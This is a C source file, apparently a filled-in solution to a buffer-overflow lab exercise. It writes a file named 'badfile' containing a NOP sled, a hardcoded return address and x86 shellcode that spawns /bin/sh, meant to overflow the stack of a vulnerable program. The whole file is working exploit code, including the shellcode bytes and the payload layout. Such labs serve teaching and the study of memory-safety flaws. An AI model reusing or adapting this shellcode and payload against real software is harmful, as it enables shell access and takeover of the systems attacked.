/* exploit.c */

/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc0" /*Line1:xorl%eax,%eax*/
                   "\x50"     /*Line2:pushl%eax*/
                   "\x68""//sh" /*Line3:pushl$0x68732f2f*/
                   "\x68""/bin" /*Line4:pushl$0x6e69622f*/
                   "\x89\xe3" /*Line5:movl%esp,%ebx*/
                   "\x50"     /*Line6:pushl%eax*/
                   "\x53"     /*Line7:pushl%ebx*/
                   "\x89\xe1" /*Line8:movl%esp,%ecx*/
                   "\x99"     /*Line9:cdq*/
                   "\xb0\x0b" /*Line10:movb$0x0b,%al*/
                   "\xcd\x80" /*Line11:int$0x80*/
    ;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile; /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */
    // *((long *)(buffer + 36)) = 0xbfffeb08 + 0x88;
    // memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));
    strcpy(buffer, "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb4\xf1\xff\xbf");
    strcpy(buffer + 100, shellcode);

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}